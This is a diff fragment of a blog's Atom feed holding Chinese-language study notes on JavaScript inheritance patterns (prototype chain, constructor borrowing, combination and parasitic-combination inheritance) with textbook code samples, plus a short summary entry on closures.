+&lt;/ul&gt;
+&lt;h2 id=&quot;继承&quot;&gt;&lt;a href=&quot;#继承&quot; class=&quot;headerlink&quot; title=&quot;继承&quot;&gt;&lt;/a&gt;继承&lt;/h2&gt;&lt;h3 id=&quot;原型链&quot;&gt;&lt;a href=&quot;#原型链&quot; class=&quot;headerlink&quot; title=&quot;原型链&quot;&gt;&lt;/a&gt;原型链&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;特点：sub.prototype=new super();来获取sub指向sub的prototype,sub的protoype又指向super的prototype并获取了super()内部方法&lt;/li&gt;
+&lt;li&gt;缺点：sub实例共享super()内部方法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;构造函数&quot;&gt;&lt;a href=&quot;#构造函数&quot; class=&quot;headerlink&quot; title=&quot;构造函数&quot;&gt;&lt;/a&gt;构造函数&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;特点：super.call(this,args);采用call，使sub实例创建时,调用super构造函数，采用this,使每一个实例都有super里面的属性和方法的副本，&lt;/li&gt;
+&lt;li&gt;缺点：方法都在构造函数里的话，函数复用？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;组合继承&quot;&gt;&lt;a href=&quot;#组合继承&quot; class=&quot;headerlink&quot; title=&quot;组合继承&quot;&gt;&lt;/a&gt;组合继承&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Sub.prototype = new Super(); 将sub原型对象的构造函数指向sub,Sub.prototype.constructor = Sub; super.call(this,args);&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;原型式继承&quot;&gt;&lt;a href=&quot;#原型式继承&quot; class=&quot;headerlink&quot; title=&quot;原型式继承&quot;&gt;&lt;/a&gt;原型式继承&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function object(o){
+    function F(){}
+    F.prototype = o;
+    return new F();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;寄生式继承&quot;&gt;&lt;a href=&quot;#寄生式继承&quot; class=&quot;headerlink&quot; title=&quot;寄生式继承&quot;&gt;&lt;/a&gt;寄生式继承&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;funtion createAnother(original){
+    var o=object(original);
+    o.sayHi=function(){
+        alert(&amp;quot;hi&amp;quot;);
+    }
+    return o;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;寄生组合式继承&quot;&gt;&lt;a href=&quot;#寄生组合式继承&quot; class=&quot;headerlink&quot; title=&quot;寄生组合式继承&quot;&gt;&lt;/a&gt;寄生组合式继承&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function SuperType(name){
+    this.name = name;
+    this.colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;];
+}
+SuperType.prototype.sayName = function(){
+    alert(this.name);
+};
+function SubType(name, age){
+    SuperType.call(this, name); // 第二次调用 SuperType()
+    this.age = age;
+}
+SubType.prototype = new SuperType(); // 第一次调用 SuperType()
+SubType.prototype.constructor = SubType;
+SubType.prototype.sayAge = function(){
+alert(this.age);
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;组合继承有个问题，会重复调用SuperType(),对于superType里面的属性和方法，第一次调用先引用，第二次调用后吧第一次引用的覆盖掉  &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function inheritPrototype(subType, superType){
+    var prototype = object(superType.prototype); //创建对象
+    prototype.constructor = subType; //增强对象
+    subType.prototype = prototype; //指定对象
+}
+function SuperType(name){
+    this.name = name;
+    this.colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;];
+}
+SuperType.prototype.sayName = function(){
+    alert(this.name);
+};
+function SubType(name, age){
+    SuperType.call(this, name);
+    this.age = age;
+}
+inheritPrototype(SubType, SuperType);
+SubType.prototype.sayAge = function(){
+    alert(this.age);
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;超类函数里面的属性和方法可以通过调用构造函数生成一个副本&lt;br&gt;对于超类原型对象中的属性与方法，若直接引用，子类修改原型对象则会影响超类而且constructor不能指向子类。可通过将一个临时构造函数的原型对象引用超类的原型对象，再生成一个实例，子类的原型对象引用实例，子类在实例上修改则不会影响到超类，同时可将constructor指向子类。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;闭包&quot;&gt;&lt;a href=&quot;#闭包&quot; class=&quot;headerlink&quot; title=&quot;闭包&quot;&gt;&lt;/a&gt;闭包&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;定义：是有权访问另一个函数作用域中变量的函数&lt;/li&gt;
+&lt;li&gt;作用：让变量常驻内存，保护作用&lt;/li&gt;
+&lt;li&gt;原因：JavaScript中的函数运行在它们被定义的作用域里，而不是它们被执行的作用域里。&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+</feed>
